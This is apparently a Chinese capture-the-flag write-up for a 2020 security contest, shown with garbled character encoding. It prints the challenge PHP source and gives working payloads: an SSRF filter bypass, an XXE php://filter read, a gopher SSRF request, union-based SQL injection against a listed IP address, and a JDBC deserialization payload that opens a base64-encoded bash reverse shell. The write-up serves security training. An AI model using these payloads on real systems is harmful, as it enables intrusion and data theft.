<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#æœ¬é¢˜æ— æ³•è®¿é—®å¤–ç½‘</span></span><br><span class="line"><span class="comment">#è¿™é¢˜çœŸæ²¡æœ‰å…¶ä»–æ–‡ä»¶ï¼Œè¯·ä¸è¦å†å¼€ç›®å½•æ‰«æå™¨äº†ï¼Œæœ‰çš„æ–‡ä»¶æˆ‘éƒ½åœ¨æ³¨é‡Šé‡Œé¢å‘Šè¯‰ä½ ä»¬äº†</span></span><br><span class="line"><span class="comment">#å„ä½å¤§ä½¬...è¿™é¢˜éƒ½æ²¡æœ‰æ•°æ®åº“çš„å­˜åœ¨...éº»çƒ¦ä¸è¦ç”¨å·¥å…·æ‰«æˆ‘äº†å¥½ä¸å¥½</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// è®¾ç½®è¶…æ—¶</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®è¶…æ—¶</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// è¦æ±‚ç»“æœä¸ºå­—ç¬¦ä¸²ä¸”è¾“å‡ºåˆ°å±å¹•ä¸Š</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨è¯ä¹¦ï¼šcert ä¸ key åˆ†åˆ«å±äºä¸¤ä¸ª.pemæ–‡ä»¶</span></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure>

<p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#è¿™é¢˜åœ¨ä¸Šåˆçš„æ—¶å€™ä¸ºäº†é˜²æ­¢æœ‰äººç”¨webshellæ‰«æå™¨dï¼Œæœ‰ä¸€æ®µæ—¶é—´ä¸´æ—¶è¿‡æ»¤äº†systemå…³é”®å­—ï¼Œä½†æ˜¯è¿™ä¸ªå…³é”®å­—åœ¨è§£é¢˜ä¸­æ˜¯ç”¨ä¸åˆ°çš„ï¼Œæ‰€ä»¥æ‰è¿‡æ»¤å®ƒï¼Œç»™é€‰æ‰‹é€ æˆçš„ä¸ä¾¿è¯·æ‚¨è°…è§£</span></span><br><span class="line"><span class="comment">#è¿™é¢˜å’Œå‘½ä»¤æ‰§è¡Œæ— å…³ï¼Œè¯·å‹¿å°è¯•</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div.main&#123;</span><br><span class="line">    width:<span class="number">90</span>%;</span><br><span class="line">    max-width:<span class="number">50</span>%;</span><br><span class="line">    margin:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">textarea&#123;</span><br><span class="line">    width:<span class="number">100</span>%;</span><br><span class="line">    height:<span class="number">100</span>%;</span><br><span class="line">&#125;</span><br><span class="line">input[type=<span class="string">"submit"</span>]&#123;</span><br><span class="line">    margin: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class="main"&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">"data"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ($data!=<span class="keyword">false</span>)?htmlspecialchars($data):htmlspecialchars(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input style=<span class="string">""</span> type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a target=<span class="string">"_blank"</span> href=<span class="string">"&lt;?php echo basename(__FILE__).'?s';?&gt;"</span>&gt;View Source Code&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>main.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'â€¬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'â€¬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hints.php</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">#there is an main.php</span></span><br><span class="line"><span class="meta">#â€œå¤§ä½¬ï¼Œè¦ä¸å’±ä»¬ç”¨ä¸€ä¸ªå¥½é•¿å¥½é•¿çš„æ•°å­—çš„md5åšé€šä¿¡å¯†ç å§â€</span></span><br><span class="line"><span class="meta">#â€œé‚£ä½ ç»™æˆ‘ç®—ä¸€ä¸ªå‡ºæ¥â€</span></span><br><span class="line"><span class="meta">#â€œå¥½çš„â€</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#å°ç™½æ‰“å¼€äº†win10çš„calcï¼Œå¼€å§‹è®¡ç®—8129947191207+1992100742919</span></span><br><span class="line"><span class="meta">#ç„¶åä»–ç›´æ¥ç”¨é¼ æ ‡å¤åˆ¶äº†ç»“æœï¼Œè®¡ç®—md5å€¼</span></span><br><span class="line"><span class="meta">#â€œå¥½äº†å¤§ä½¬ï¼Œ10122047934126çš„md5å€¼â€</span></span><br><span class="line"><span class="meta">#â€œ6dc6a29df1d7d33166bba5e17e42d2eaå¯¹å§â€</span></span><br><span class="line"><span class="meta">#â€œå“ˆï¼Ÿï¼Ÿï¼Ÿä¸æ˜¯3e3e7d453061d953bce39ed3e82fd2a1å—â€</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#â€œå’±ä»¬å¯¹ä¸€ä¸‹æ•°å­—ï¼Ÿâ€</span></span><br><span class="line"><span class="meta">#â€­10122047934126â€¬</span></span><br><span class="line"><span class="meta">#10122047934126</span></span><br><span class="line"><span class="meta">#â€œè¿™ä¸æ˜¯ä¸€æ ·çš„å—....å’‹å°±md5ä¸ä¸€æ ·äº†.......â€</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#æ‰¾å‡ºæ¥åˆ°åº•å“ªé‡Œå‡ºäº†é—®é¢˜ï¼Œå°±å¯ä»¥çœ‹è¿™é“webé¢˜ç›®äº†</span></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¿™é‡Œhints.phpçš„å†…å®¹æç¤ºï¼Œwin10çš„è®¡ç®—å™¨é¼ æ ‡ç›´æ¥å¤åˆ¶åï¼Œä¼šåœ¨æ•°å­—çš„å‰ååŠ ä¸Šä¸¤ä¸ªä¸å¯è§çš„unicodeå­—ç¬¦%e2%80%adå’Œ%e2%80%acï¼Œåœ¨è¿™é‡Œçš„<code>unserialize($_GET[&#39;â€¬&#39;])</code>éƒ¨åˆ†ï¼Œæµ‹è¯•åå‘ç°å¯ä»¥ç”¨<code>%e2%80%ac=123</code>ä¼ å‚å†…å®¹ã€‚<br>åˆ°è¿™ä¸€æ­¥æŒ‰ç…§é¢„æœŸåº”è¯¥æ˜¯åˆ©ç”¨ä¸¤ä¸ªç±»çš„ååºåˆ—åŒ–æ“ä½œå»æƒ³åŠæ³•è¯»å–flag.txtå†…å®¹äº†ï¼Œä½†æ˜¯å…¶å®å›è¿‡å¤´çœ‹çœ‹ï¼Œxxe.phpå·²ç»èƒ½å¤Ÿä»»æ„æ–‡ä»¶è¯»å–äº†ä¸æ˜¯å—ï¼Ÿ</p>
<ol>
<li><p>urlç¼–ç ç»•è¿‡</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];  <span class="comment">#ä¸ä¼šå¯¹urlè§£ç ï¼Œæ‰€ä»¥ç›´æ¥ç»•è¿‡è¿‡æ»¤</span></span><br></pre></td></tr></table></figure>

<p> payload</p>
<p> <code>a=%66%69%6c%65:///var/www/html/%66%6c%61%67.php&amp;b=%66%69%6c%65:///var/www/html/%6 6%6c%61%67.php</code></p>
<p> <img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626110638762.png" alt="image-20200626110638762"></p>
</li>
<li><p>gopher</p>
<p> SSRF åˆ©ç”¨ gopher æ¨¡æ‹Ÿ POST è¯·æ±‚ï¼Œè®¿é—® xxe.phpï¼Œç„¶ååˆ©ç”¨ xxe æ¥è¯»æ–‡ä»¶</p>
<p> index.php ç”¨çš„è¿‡æ»¤å‡½æ•°æ˜¯ preg_match</p>
<p> è€Œåœ¨ xxe.php é‡Œç”¨çš„æ˜¯ replace</p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,<span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure>

<p> é‚£ä¹ˆå¯ä»¥ç›´æ¥ç”¨ åŒå†™çš„æ–¹å¼æ¥ bypass, ç±»ä¼¼è¿™æ ·ï¼š</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">flreadag</span>   ==&gt; preg_replace(<span class="string">"/flag/i"</span>, <span class="string">''</span>, <span class="variable">$data</span>) ==&gt; flag</span><br></pre></td></tr></table></figure>

<p> æ¥ç€xxeè¯»å–æ–‡ä»¶</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ureadtf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/rereadad=convert.base64-encode/resource=flreadag.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>å…ˆURLç¼–ç ä¸‹ï¼Œè°ä¾¿POSTä¸€ä¸‹è·å–<code>Content-Length</code></p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626120356953.png" alt="image-20200626120356953"></p>
<p>ç„¶åå°†dataå†URLç¼–ç ä¸¤æ¬¡(ç”¨PHPå‡½æ•°)</p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626120455719.png" alt="image-20200626120455719"></p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">a=1&amp;b=1&amp;c=gopher://127.0.0.1:80/_POST%2520/xxe.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%2520611%250D%250A%250D%250Adata%253D%25253c%25253f%252578%25256d%25256c%252520%252576%252565%252572%252573%252569%25256f%25256e%25253d%252522%252531%25252e%252530%252522%252520%252565%25256e%252563%25256f%252564%252569%25256e%252567%25253d%252522%252575%252572%252565%252561%252564%252574%252566%25252d%252538%252522%25253f%25253e%25250a%25253c%252521%252544%25254f%252543%252554%252559%252550%252545%252520%252578%252565%252520%25255b%25250a%25253c%252521%252545%25254c%252545%25254d%252545%25254e%252554%252520%25256e%252561%25256d%252565%252520%252541%25254e%252559%252520%25253e%25250a%25253c%252521%252545%25254e%252554%252549%252554%252559%252520%252578%252565%252520%252553%252559%252553%252554%252545%25254d%252520%252522%252570%252568%252570%25253a%25252f%25252f%252566%252569%25256c%252574%252565%252572%25252f%252572%252565%252572%252565%252561%252564%252561%252564%25253d%252563%25256f%25256e%252576%252565%252572%252574%25252e%252562%252561%252573%252565%252536%252534%25252d%252565%25256e%252563%25256f%252564%252565%25252f%252572%252565%252573%25256f%252575%252572%252563%252565%25253d%252566%25256c%252572%252565%252561%252564%252561%252567%25252e%252570%252568%252570%252522%252520%25253e%25255d%25253e%25250a%25253c%252572%25256f%25256f%252574%25253e%25250a%25253c%25256e%252561%25256d%252565%25253e%252526%252578%252565%25253b%25253c%25252f%25256e%252561%25256d%252565%25253e%25250a%25253c%25252f%252572%25256f%25256f%252574%25253e</span><br></pre></td></tr></table></figure>

<h3 id="3-zzmâ€™s-blog"><a href="#3-zzmâ€™s-blog" class="headerlink" title="3.zzmâ€™s blog"></a>3.<strong>zzmâ€™s blog</strong></h3><p>æ ¹æ®é¢˜ç›®ç»™çš„pom.xml</p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626132854601.png" alt="image-20200626132854601"></p>
<p>å’Œè¿™ç¯‡<a href="https://b1ue.cn/archives/189.html#pom.xml" target="_blank" rel="noopener">æ–‡ç« </a>jdbc urlå¯ä»¥æŒ‡å®šå¯¼è‡´rce</p>
<p>å…ˆæ­ä¸€ä¸ª<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">æ¶æ„çš„mysqlæœåŠ¡å™¨</a>å’ŒJAVAåºåˆ—åŒ–çš„å·¥å…·<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626133727220.png" alt="image-20200626133727220"></p>
<p>æ¥ç€ç›‘å¬ç«¯å£</p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626133825721.png" alt="image-20200626133825721"></p>
<p>payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:[<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>, <span class="string">"jdbc:mysql://ip:port/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections5_bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mICAgL2Rldi90Y3AvMS4xLjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200626133930336.png" alt="image-20200626133930336"></p>
<h3 id="4-ç¾å›¢å¤–å–"><a href="#4-ç¾å›¢å¤–å–" class="headerlink" title="4.ç¾å›¢å¤–å–"></a>4.<strong>ç¾å›¢å¤–å–</strong></h3><p><code>www.zip</code>æºç æ³„éœ²</p>
<p>åœ¨daochu.phpå­˜åœ¨æ³¨å…¥</p>
<p>å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$type=$_GET[<span class="string">'type'</span>];</span><br><span class="line">$imei=$_GET[<span class="string">'imei'</span>];</span><br><span class="line">$imei2=$_GET[<span class="string">'imei2'</span>];</span><br><span class="line"><span class="keyword">if</span>($type==<span class="number">1</span>)&#123;</span><br><span class="line">true$biao=<span class="string">'content'</span>;</span><br><span class="line">true$result = mysqli_query($link,<span class="string">'select * from '</span>.$biao.<span class="string">' where imei="'</span>.$imei.<span class="string">'" and  imei2="'</span>.$imei2.<span class="string">'"'</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="symbol">%23</span> //å­—æ®µæ•°ä¸º<span class="number">6</span></span><br></pre></td></tr></table></figure>

<p>å›æ˜¾4ï¼Œ6ï¼Œ2, 3</p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627101937077.png" alt="image-20200627101937077"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(schema_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata<span class="symbol">%23</span>  //æ•°æ®åº“å</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627102635262.png" alt="image-20200627102635262"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='cms'<span class="symbol">%23</span>   //è¡¨</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627102842991.png" alt="image-20200627102842991"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>d'cms'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name<span class="symbol">%3</span>d'hint'<span class="symbol">%23</span> //å­—æ®µ</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627104512801.png" alt="image-20200627104512801"></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://<span class="number">119.3</span>.<span class="number">183.154</span>/daochu.php?<span class="keyword">type</span>=<span class="number">1</span>&amp;imei=a&amp;ime<span class="keyword">i2</span>=b<span class="symbol">%22</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,group_concat(hints)<span class="symbol">%20</span>from<span class="symbol">%20</span>hint<span class="symbol">%23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627104803417.png" alt="image-20200627104803417"></p>
<p>å¼€å§‹ä¸èƒ½è®¿é—®çš„<code>/lib/webuploader/0.1.5/server/preview.php</code>åŠ ä¸Šè¿™ä¸ªç›®å½•å°±è¡Œäº†ï¼ŒPOSTæ•°æ®å°±è¡Œ</p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627105703977.png" alt="image-20200627105703977"></p>
<p><img src="/2020/06/ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›/image-20200627105855419.png" alt="image-20200627105855419"></p>
<h3 id="5-laravel"><a href="#5-laravel" class="headerlink" title="5.laravel"></a>5.<strong>laravel</strong></h3><p><code>./artisan -v</code>  å¾—åˆ°ç‰ˆæœ¬ <code>Laravel Framework 5.7.28</code></p>
<p>5.7.Xç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´,æ ¹æ®<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">æ–‡ç« </a>æŸ¥çœ‹æºç å‘ç° <code>vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php</code>çš„ <code>run</code>æ–¹æ³•è¢«åˆ é™¤äº†ï¼Œåªèƒ½æ‰¾å…¶ä»–é“¾å­</p>
<p>ç„¶åæ ¹æ®è¿™ç¯‡<a href="https://www.anquanke.com/post/id/184541#h3-2%E3%80%82" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>æ ¹æ®æ–‡ä»¶å¯¹æ¯”å·¥å…·</p>
<p><code>app\Http\Controllers\TaskController.php</code>æœ‰ä¸ªååºåˆ—åŒ–</p>
